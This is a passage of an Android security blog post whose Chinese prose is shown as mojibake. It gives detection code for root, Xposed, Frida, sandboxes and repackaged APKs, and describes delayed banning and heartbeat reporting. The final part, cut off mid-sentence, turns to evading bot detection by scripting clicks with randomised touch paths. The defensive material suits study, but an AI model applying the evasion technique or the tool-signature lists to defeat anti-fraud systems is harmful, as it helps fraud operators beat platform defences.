class="line">// LSPosed ç‰¹å¾è·¯å¾„</span><br><span class="line">var lsposedPaths = [</span><br><span class="line">    &quot;/data/misc/lsposed&quot;,</span><br><span class="line">    &quot;/system/framework/lspatch.jar&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// æ£€æµ‹Zygoteæ³¨å…¥</span><br><span class="line">function checkZygoteHook() &#123;</span><br><span class="line">    // æ£€æŸ¥ /proc/self/maps æ˜¯å¦åŒ…å« libriru.so</span><br><span class="line">    // æ£€æŸ¥ /proc/[pid]/maps ä¸­çš„å¯ç–‘åº“</span><br><span class="line">&#125;</span><br><span class="line">// Javaå±‚</span><br><span class="line">String buildTags = Build.TAGS;</span><br><span class="line">boolean isTestKeys = buildTags.contains(&quot;test-keys&quot;); // éå®˜æ–¹ROMæ ‡å¿—</span><br><span class="line"></span><br><span class="line">// Nativeå±‚æ£€æµ‹selinuxçŠ¶æ€</span><br><span class="line">// getenforce() == &quot;Permissive&quot; è¡¨ç¤ºå¯èƒ½è¢«ä¿®æ”¹</span><br></pre></td></tr></table></figure><h4 id="Hookæ£€æµ‹"><a href="#Hookæ£€æµ‹" class="headerlink" title="Hookæ£€æµ‹"></a>Hookæ£€æµ‹</h4><p><strong>Xposedæ£€æµ‹ï¼š</strong>ä¸ŠæŠ¥Hookæ–¹æ³•æ¸…å•ï¼Œæ£€æµ‹Xposedç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// æ‰«ææ‰€æœ‰è¢«Hookçš„æ–¹æ³•</span><br><span class="line">public static List&lt;String&gt; getXposedHookedMethods() &#123;</span><br><span class="line">    List&lt;String&gt; hookedMethods = new ArrayList&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    // éå†å…³é”®ç±»çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="line">    Class&lt;?&gt; targetClass = YourClass.class;</span><br><span class="line">    for (Method method : targetClass.getDeclaredMethods()) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // æ£€æŸ¥æ–¹æ³•æ˜¯å¦åŒ…å«Xposedæ¡¥æ¥</span><br><span class="line">            Field fieldHookedMethod = </span><br><span class="line">                Method.class.getDeclaredField(&quot;artMethod&quot;);</span><br><span class="line">            fieldHookedMethod.setAccessible(true);</span><br><span class="line">            long artMethod = (long) fieldHookedMethod.get(method);</span><br><span class="line">            </span><br><span class="line">            // åˆ†æArtMethodç»“æ„ï¼Œæ£€æµ‹hookæ ‡å¿—</span><br><span class="line">            // ...</span><br><span class="line">            </span><br><span class="line">        &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return hookedMethods;</span><br><span class="line">&#125;</span><br><span class="line">// æ£€æµ‹XposedBridgeç±»</span><br><span class="line">try &#123;</span><br><span class="line">    Class.forName(&quot;de.robv.android.xposed.XposedBridge&quot;);</span><br><span class="line">    // å‘ç°Xposedæ¡†æ¶</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    // æœªå‘ç°</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// æ£€æµ‹ClassLoaderå¼‚å¸¸</span><br><span class="line">ClassLoader classLoader = YourClass.class.getClassLoader();</span><br><span class="line">String clName = classLoader.getClass().getName();</span><br><span class="line">if (clName.contains(&quot;XposedBridge&quot;)) &#123;</span><br><span class="line">    // æ£€æµ‹åˆ°Xposed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Fridaæ£€æµ‹ï¼š</strong>Inline Hookæ£€æµ‹ï¼ŒFridaç‰¹å¾æ£€æµ‹ï¼Œæ£€æµ‹å¸¸è§Hookç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">// Nativeå±‚å®ç°</span><br><span class="line">#include &lt;elf.h&gt;</span><br><span class="line"></span><br><span class="line">// 1. è§£ææœ¬åœ°ELFæ–‡ä»¶è·å–åŸå§‹æŒ‡ä»¤</span><br><span class="line">uint32_t getOriginalInstruction(const char* soPath, </span><br><span class="line">                                  const char* funcName) &#123;</span><br><span class="line">    // è§£æELFæ–‡ä»¶</span><br><span class="line">    // è·å–å‡½æ•°ç¬¦å·è¡¨</span><br><span class="line">    // è¯»å–å‡½æ•°åç§»å¤„çš„æŒ‡ä»¤</span><br><span class="line">    return originalInstruction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 2. è¯»å–å†…å­˜ä¸­çš„å½“å‰æŒ‡ä»¤</span><br><span class="line">uint32_t getCurrentInstruction(void* funcAddr) &#123;</span><br><span class="line">    return *(uint32_t*)funcAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 3. å¯¹æ¯”æ£€æµ‹</span><br><span class="line">bool isFunctionHooked(const char* soPath, </span><br><span class="line">                       const char* funcName, </span><br><span class="line">                       void* funcAddr) &#123;</span><br><span class="line">    uint32_t original = getOriginalInstruction(soPath, funcName);</span><br><span class="line">    uint32_t current = getCurrentInstruction(funcAddr);</span><br><span class="line">    </span><br><span class="line">    if (original != current) &#123;</span><br><span class="line">        // æ£€æµ‹åˆ°Hookï¼</span><br><span class="line">        log(&quot;Function %s is hooked!&quot;, funcName);</span><br><span class="line">        log(&quot;Original: 0x%08x, Current: 0x%08x&quot;, original, current);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">// æ£€æµ‹Frida-serverç«¯å£ï¼ˆé»˜è®¤27042ï¼‰</span><br><span class="line">bool checkFridaPort() &#123;</span><br><span class="line">    FILE* fp = fopen(&quot;/proc/net/tcp&quot;, &quot;r&quot;);</span><br><span class="line">    // æ‰«æç«¯å£ï¼š27042, 27043ç­‰</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// æ£€æµ‹Fridaçº¿ç¨‹</span><br><span class="line">bool checkFridaThread() &#123;</span><br><span class="line">    DIR* dir = opendir(&quot;/proc/self/task&quot;);</span><br><span class="line">    // éå†çº¿ç¨‹ï¼Œæ£€æŸ¥çº¿ç¨‹åï¼šgmain, gdbus, gum-js-loop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// æ£€æµ‹Fridaåº“æ–‡ä»¶</span><br><span class="line">const char* fridaLibs[] = &#123;</span><br><span class="line">    &quot;frida-agent&quot;,</span><br><span class="line">    &quot;frida-gadget&quot;, </span><br><span class="line">    &quot;libfrida&quot;,</span><br><span class="line">    &quot;re.frida&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// æ‰«æ /proc/self/maps</span><br><span class="line">// æ£€æŸ¥libc.soå…³é”®å‡½æ•°</span><br><span class="line">void* funcs[] = &#123;</span><br><span class="line">    dlopen,</span><br><span class="line">    dlsym,</span><br><span class="line">    open,</span><br><span class="line">    read,</span><br><span class="line">    write,</span><br><span class="line">    // ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">for (int i = 0; i &lt; sizeof(funcs)/sizeof(void*); i++) &#123;</span><br><span class="line">    if (isFunctionHooked(&quot;libc.so&quot;, funcNames[i], funcs[i])) &#123;</span><br><span class="line">        // ä¸ŠæŠ¥è¢«Hookçš„å‡½æ•°</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ²™ç®±-è™šæ‹Ÿç¯å¢ƒæ£€æµ‹"><a href="#æ²™ç®±-è™šæ‹Ÿç¯å¢ƒæ£€æµ‹" class="headerlink" title="æ²™ç®±&amp;è™šæ‹Ÿç¯å¢ƒæ£€æµ‹"></a>æ²™ç®±&amp;è™šæ‹Ÿç¯å¢ƒæ£€æµ‹</h4><p>è¿›ç¨‹ç¯å¢ƒæ£€æµ‹ï¼Œç§æœ‰è·¯å¾„æ£€æµ‹ï¼Œæ–‡ä»¶æè¿°ç¬¦æ£€æµ‹ï¼ŒIPCåŠ¨æ€ä»£ç†æ£€æµ‹ï¼ŒParent PIDæ£€æµ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ£€æŸ¥å¯åŠ¨æ—¶è¿›ç¨‹æ•°é‡</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">checkProcessCount</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE* fp = popen(<span class="string">&quot;ps -A&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), fp)) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ­£å¸¸è®¾å¤‡å¯åŠ¨æ—¶è¿›ç¨‹æ•° &gt; 50</span></span><br><span class="line">    <span class="comment">// æ²™ç®±ç¯å¢ƒå¯èƒ½åªæœ‰å‡ ä¸ªè¿›ç¨‹</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="comment">// å¯ç–‘æ²™ç®±ç¯å¢ƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ£€æŸ¥åº”ç”¨ç§æœ‰ç›®å½•</span></span><br><span class="line">String dataDir = getApplicationInfo().dataDir;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£å¸¸è·¯å¾„: /data/data/com.example.app</span></span><br><span class="line"><span class="comment">// æ²™ç®±è·¯å¾„: /data/data/com.virtualapp.xxx/virtual/data/com.example.app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dataDir.equals(<span class="string">&quot;/data/data/&quot;</span> + getPackageName())) &#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹åˆ°è™šæ‹Ÿç¯å¢ƒï¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ£€æµ‹å¼‚å¸¸çš„fd</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">checkFileDescriptors</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR* dir = opendir(<span class="string">&quot;/proc/self/fd&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">entry</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">char</span> fdPath[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">sprintf</span>(fdPath, <span class="string">&quot;/proc/self/fd/%s&quot;</span>, entry-&gt;d_name);</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> linkPath[<span class="number">256</span>];</span><br><span class="line">        <span class="type">ssize_t</span> len = readlink(fdPath, linkPath, <span class="keyword">sizeof</span>(linkPath)<span class="number">-1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„socketã€pipeç­‰</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(linkPath, <span class="string">&quot;virtualapp&quot;</span>) || </span><br><span class="line">            <span class="built_in">strstr</span>(linkPath, <span class="string">&quot;parallel&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// æ£€æµ‹åˆ°æ²™ç®±ç‰¹å¾</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ£€æµ‹ç³»ç»ŸæœåŠ¡æ˜¯å¦è¢«ä»£ç†</span></span><br><span class="line">Object activityManager = context.getSystemService(</span><br><span class="line">    Context.ACTIVITY_SERVICE);</span><br><span class="line">    </span><br><span class="line">String className = activityManager.getClass().getName();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (className.contains(<span class="string">&quot;Proxy&quot;</span>) || </span><br><span class="line">    className.contains(<span class="string">&quot;$Proxy&quot;</span>) ||</span><br><span class="line">    className.contains(<span class="string">&quot;Hook&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹åˆ°åŠ¨æ€ä»£ç†ï¼å…¸å‹çš„VAç‰¹å¾</span></span><br><span class="line">    <span class="built_in">log</span>(<span class="string">&quot;IPCè¢«ä»£ç†: &quot;</span> + className);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æµ‹å¤šä¸ªç³»ç»ŸæœåŠ¡</span></span><br><span class="line">String[] services = &#123;</span><br><span class="line">    Context.ACTIVITY_SERVICE,</span><br><span class="line">    Context.PACKAGE_SERVICE,</span><br><span class="line">    Context.LOCATION_SERVICE,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// æ£€æŸ¥çˆ¶è¿›ç¨‹</span></span><br><span class="line"><span class="type">pid_t</span> ppid = getppid();</span><br><span class="line"><span class="type">char</span> cmdline[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(cmdline, <span class="string">&quot;/proc/%d/cmdline&quot;</span>, ppid);</span><br><span class="line"></span><br><span class="line">FILE* fp = fopen(cmdline, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£å¸¸æƒ…å†µä¸‹çˆ¶è¿›ç¨‹æ˜¯zygote</span></span><br><span class="line"><span class="comment">// æ²™ç®±ç¯å¢ƒä¸‹å¯èƒ½æ˜¯VAã€Parallel Spaceç­‰</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strstr</span>(cmdline, <span class="string">&quot;zygote&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">log</span>(<span class="string">&quot;å¼‚å¸¸çˆ¶è¿›ç¨‹: %s&quot;</span>, cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>æ­¤å­—æ®µä¸€èˆ¬åœ¨ç¯å¢ƒå æ¯”ä¸­å¾ˆé‡è¦ï¼Œå½“å½“å‰Appç¯å¢ƒä¸€æ—¦è¢«çŸ³é”¤æ²™ç®±ç¯å¢ƒä»¥åï¼Œç›´æ¥å¯è®¤å®šå½“å‰ç”¨æˆ·ä¸ºé»‘è®¾å¤‡</strong></p></blockquote><h4 id="APKç­¾åæ£€æµ‹"><a href="#APKç­¾åæ£€æµ‹" class="headerlink" title="APKç­¾åæ£€æµ‹"></a>APKç­¾åæ£€æµ‹</h4><p>æ£€æµ‹ç­¾åä¿¡æ¯ï¼Œæ£€æµ‹ç­¾åæ¥æºï¼ˆAndroid 9+ï¼‰ï¼ŒNativeå±‚æ ¡éªŒï¼ˆé˜²ç¯¡æ”¹ï¼‰ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–APKç­¾å</span></span><br><span class="line"><span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">    .getPackageInfo(context.getPackageName(), </span><br><span class="line">                    PackageManager.GET_SIGNATURES);</span><br><span class="line"></span><br><span class="line">Signature[] signatures = packageInfo.signatures;</span><br><span class="line"><span class="type">String</span> <span class="variable">signMd5</span> <span class="operator">=</span> getMD5(signatures[<span class="number">0</span>].toByteArray());</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸é¢„ç½®çš„æ­£ç‰ˆç­¾åå¯¹æ¯”</span></span><br><span class="line"><span class="type">String</span> <span class="variable">OFFICIAL_SIGN</span> <span class="operator">=</span> <span class="string">&quot;ä½ çš„å®˜æ–¹ç­¾åMD5&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!signMd5.equals(OFFICIAL_SIGN)) &#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹åˆ°é‡æ‰“åŒ…ï¼</span></span><br><span class="line">    <span class="comment">// è¿™æ˜¯é»‘äº§è®¾å¤‡çš„çŸ³é”¤è¯æ®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Android PåŠä»¥ä¸Š</span></span><br><span class="line"><span class="type">PackageInfo</span> <span class="variable">info</span> <span class="operator">=</span> pm.getPackageInfo(packageName,</span><br><span class="line">    PackageManager.GET_SIGNING_CERTIFICATES);</span><br><span class="line"></span><br><span class="line"><span class="type">SigningInfo</span> <span class="variable">signingInfo</span> <span class="operator">=</span> info.signingInfo;</span><br><span class="line"><span class="keyword">if</span> (signingInfo.hasMultipleSigners()) &#123;</span><br><span class="line">    <span class="comment">// å¤šç­¾åï¼Œå¯ç–‘</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¯»å–APKæ–‡ä»¶ï¼Œè®¡ç®—hash</span></span><br><span class="line"><span class="comment">// å¯¹æ¯”é¢„åŸ‹çš„hashå€¼</span></span><br><span class="line">bool <span class="title function_">verifyApkIntegrity</span><span class="params">()</span> &#123;</span><br><span class="line">    const <span class="type">char</span>* apkPath = <span class="string">&quot;/data/app/.../base.apk&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®¡ç®—APKçš„SHA256</span></span><br><span class="line">    <span class="type">char</span>* hash = calculateSHA256(apkPath);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¯¹æ¯”é¢„åŸ‹hashï¼ˆåŠ å¯†å­˜å‚¨ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (strcmp(hash, OFFICIAL_HASH) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// è¢«ç¯¡æ”¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¨¡æ‹Ÿå™¨æ£€æµ‹"><a href="#æ¨¡æ‹Ÿå™¨æ£€æµ‹" class="headerlink" title="æ¨¡æ‹Ÿå™¨æ£€æµ‹"></a>æ¨¡æ‹Ÿå™¨æ£€æµ‹</h4><p>åŸºç¡€ç‰¹å¾æ£€æµ‹ï¼ŒCPUç‰¹å¾æ£€æµ‹ï¼Œä¼ æ„Ÿå™¨æ£€æµ‹ï¼Œç¡¬ä»¶ç‰¹å¾æ£€æµ‹</p><h4 id="è‡ªå®šä¹‰ROM"><a href="#è‡ªå®šä¹‰ROM" class="headerlink" title="è‡ªå®šä¹‰ROM"></a>è‡ªå®šä¹‰ROM</h4><p>ç³»ç»Ÿæ–‡ä»¶MD5æ£€æŸ¥ï¼ŒBuildå±æ€§æ£€æµ‹</p><h3 id="æŸ¥æ€åˆ†ç¦»"><a href="#æŸ¥æ€åˆ†ç¦»" class="headerlink" title="æŸ¥æ€åˆ†ç¦»"></a>æŸ¥æ€åˆ†ç¦»</h3><p>è¿™ä¸ªä¹Ÿæ˜¯ä¸€ç§å¾ˆé‡è¦çš„ç­–ç•¥ï¼Œä¸»è¦å°±æ˜¯<strong>å½“æœåŠ¡ç«¯æˆ–è€…å‘½ä¸­é£æ§</strong>ä»¥åï¼Œä»–ä¸ä¼šåŠæ—¶å°ä½ çš„å·ï¼Œæˆ–è€…ç«‹åˆ»ç»™ä½ å·è¿”å›é”™è¯¯æ•°æ®ã€‚</p><p>è€Œæ˜¯éš”ä¸€æ®µæ—¶é—´ï¼Œå¯èƒ½æ˜¯å‡ ä¸ªå°æ—¶ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯å‡ å¤©ï¼Œè¿™æ ·åšçš„å¥½å¤„é˜²æ­¢ä½ å»ä¸æ–­åœ°è¯•æ¢ä»è€Œæ‰¾åˆ°æ­£ç¡®çš„æ£€æµ‹è§„å¾‹ã€‚</p><p>é˜²æ­¢æ”»å‡»è€…ä¸æ–­è¯•æ¢çš„æ–¹å¼å»è·å–æ­£ç¡®çš„é£æ§è§„åˆ™ã€‚è§„é¿é£é™©ã€‚</p><h3 id="ç”¨æˆ·è¡Œä¸º-å¿ƒè·³åŒ…ä¸ŠæŠ¥"><a href="#ç”¨æˆ·è¡Œä¸º-å¿ƒè·³åŒ…ä¸ŠæŠ¥" class="headerlink" title="ç”¨æˆ·è¡Œä¸º&amp;å¿ƒè·³åŒ…ä¸ŠæŠ¥"></a>ç”¨æˆ·è¡Œä¸º&amp;å¿ƒè·³åŒ…ä¸ŠæŠ¥</h3><h4 id="æ£€æµ‹åŸç†ï¼š"><a href="#æ£€æµ‹åŸç†ï¼š" class="headerlink" title="æ£€æµ‹åŸç†ï¼š"></a>æ£€æµ‹åŸç†ï¼š</h4><p>ä¸€èˆ¬å¤§å‚ä¼šä½¿ç”¨è¿™ç§æ–¹æ¡ˆï¼Œåœ¨ä¸€äº›SDKåˆå§‹åŒ–ä»¥åä¼šå¼€å¯ä¸€ä¸ª<code>socket</code>ï¼Œtcpé•¿è¿æ¥ï¼Œè¦†ç›–Appæ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œå½“ç”¨æˆ·è¿›è¡Œç‚¹å‡»çš„æ—¶å€™</p><p>å¯¹é¡µé¢æŸä¸ªä½ç½®ç‚¹å‡»çš„æ—¶å€™ä¼šè¿›è¡Œä¸ŠæŠ¥ï¼Œåå°å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å½“å‰ç”¨æˆ·çš„ç‚¹å‡»è·¯å¾„ã€‚å¦‚æœæ”»å‡»è€…ç›´æ¥é€šè¿‡<strong>rpcæˆ–è€…ç®—æ³•è¿˜åŸæ¥å£ç ´è§£</strong>çš„æ–¹å¼è°ƒç”¨æ¥å£çš„è¯ï¼Œå°±<strong>å¯èƒ½ä¼šå­˜åœ¨å¿ƒè·³åŒ…é—æ¼çš„é—®é¢˜</strong>ï¼Œå½“é•¿æ—¶é—´æ— å¿ƒè·³ä»¥åï¼Œå¯èƒ½ä¼šç›´æ¥è®¤ä¸ºå½“å‰IPæ˜¯é£é™©IPï¼Œä»è€Œå®ç°å°ç¦ã€‚</p><p>è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯å¾ˆå¥½ç”¨çš„åŠæ³•ï¼Œå¯ä»¥é€šè¿‡AIç­‰è¿›è¡Œè‡ªåŠ¨åŒ–çš„è¡Œä¸ºåˆ¤æ–­ï¼Œç­‰AIçš„æ¨¡å‹å’Œæ•°æ®è¶³å¤Ÿå®Œå–„ä»¥åï¼Œå³å¯å®ç°ï¼Œè‡ªåŠ¨åŒ–åˆ¤æ–­è‡ªåŠ¨åŒ–&amp;éè‡ªåŠ¨åŒ–ï¼ˆäººæ‰‹ç‚¹å‡»ï¼‰çš„åˆ¤æ–­ã€‚</p><p>æ¯”å¦‚æŸäº›çš„è‡ªåŠ¨ç‚¹å‡»æ¡†æ¶ï¼Œå¦‚æœåªæ˜¯ä¸ºäº†ä¸šåŠ¡å»ç‚¹å‡»çš„è¯ï¼Œæ˜¯æ²¡æœ‰ä¸€äº›å¤šä½™æ“ä½œçš„ï¼Œè€Œæˆ‘ä»¬ä»¬çš„æ‰‹åœ¨å±å¹•ä¸æ–­æ»‘åŠ¨çš„æ—¶å€™æ˜¯ä¼šäº§ç”Ÿå¾ˆå¤šç”¨æˆ·è·¯å¾„ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>éšæœºè·¯å¾„</strong>ã€‚</p><h4 id="å¯¹æŠ—åŸç†"><a href="#å¯¹æŠ—åŸç†" class="headerlink" title="å¯¹æŠ—åŸç†"></a>å¯¹æŠ—åŸç†</h4><p>è‡ªåŠ¨åŒ–ç‚¹å‡»è„šæœ¬æ§åˆ¶App+ç”¨æˆ·éšæœºè·¯å¾„ï¼Œè‡ªåŠ¨åŒ–è„šæœ¬æ§åˆ¶Appå»å®ç°è‡ªåŠ¨åŒ–ç‚¹å‡»ï¼Œé˜²æ­¢å¿ƒè·³åŒ…å’Œç”¨æˆ·ç‚¹å‡»è·¯å¾„çš„é—æ¼ã€‚</p><p>éœ€è¦æ·»åŠ éšæœºè·¯å¾„ï¼Œé˜²æ­¢è¢«AIæ£€æµ‹å‡ºæ¥è‡ªåŠ¨åŒ–æ“ä½œï¼Œæ·»åŠ 